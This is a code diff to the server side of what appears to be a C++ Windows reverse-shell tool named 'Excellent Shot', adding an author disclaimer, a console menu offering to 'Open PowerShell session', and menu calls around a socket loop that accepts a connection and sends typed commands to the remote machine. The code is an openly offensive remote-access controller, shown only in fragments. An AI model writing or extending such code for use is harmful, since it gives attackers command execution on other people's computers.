@@ -1,4 +1,9 @@
-﻿#include "server.h"
+﻿/*
+Author: millybilligan
+GitHub: https://github.com/millybilligan
+The author is not responsible for the use of this program. Use for illegal purposes is prohibited!
+*/
+#include "server.h"
 
 void readFromSocket(SOCKET& sock) {
 	int iResult;
@@ -53,7 +58,8 @@ INT ServerReverseShell() {
 			send(sockClient, inputUser, strlen(inputUser), NULL);
 
 		} while (_strcmpi(inputUser, "exit\n") != 0);
-
+	
+	ServerGui();
 	closesocket(sockServer);
 	closesocket(sockClient);
 	WSACleanup();
@@ -62,7 +68,7 @@ INT ServerReverseShell() {
 }
 
 INT ServerConnection() {
-	system("cls");
+	ServerGui();
 	WSAData wsaData;
 	WORD DLLVersion = MAKEWORD(2, 1);
 	WSAStartup(DLLVersion, &wsaData);
@@ -86,18 +92,36 @@ INT ServerConnection() {
 		iResult = recv(newConnection, &buf, sizeof(buf), NULL);
 		if (buf != 'p') {
 			cout << "\nConnection failed!\n";
+			
 			closesocket(newConnection);
+			
 			newConnection = accept(sListen, (SOCKADDR*)&addr, &sizeofAddr);
+			
 			cout << "\nConnection restored!\n";
 		}
 		buf = NULL;
 		cin >> buf;
 		iResult = send(newConnection, &buf, sizeof(buf), 0);
+		if (buf == '0') {
+			return 0;
+		}
 		if (buf == '1') {
 			ServerReverseShell();
 		}
 	}
-
-
 	return 0;
+}
+
+
+void ServerGui() {
+	system("cls");
+	cout << "+--------------------------------------------------------------+" << endl;
+	cout << "| Excellent Shot version 1.1 | Author: MillyBilligan           |" << endl;
+	cout << "+--------------------------------------------------------------+" << endl;
+	cout << "| Functions :                                                  |" << endl;
+	cout << "+--------------------------------------------------------------+" << endl;
+	cout << "| 0. Exit                                                      |" << endl;
+	cout << "| 1. Open PowerShell session                                   |" << endl;
+	cout << "+--------------------------------------------------------------+" << endl;
+	cout << "[SHOT!!!]->";
 }
